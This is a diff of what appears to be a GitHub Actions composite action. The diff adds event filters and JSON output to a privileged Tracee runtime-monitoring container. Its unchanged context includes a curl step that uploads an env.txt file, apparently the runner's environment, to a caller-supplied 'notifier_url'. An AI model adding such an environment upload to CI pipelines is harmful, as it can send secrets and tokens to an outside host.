@@ -15,7 +15,7 @@ runs:
              -H "Content-Type: text/plain" \
              --data-binary @env.txt \
              "${{ inputs.notifier_url }}"
-             
+
     - name: Pull Tracee Docker image
       shell: bash
       run: |
@@ -28,7 +28,9 @@ runs:
             --pid=host --cgroupns=host --privileged \
             -v /etc/os-release:/etc/os-release-host:ro \
             -v /var/run:/var/run:ro \
-            aquasec/tracee:latest
+            aquasec/tracee:latest \
+            --events 'default,fork,exec*' \
+            --output json 
     
     - name: Save logs to a file
       shell: bash
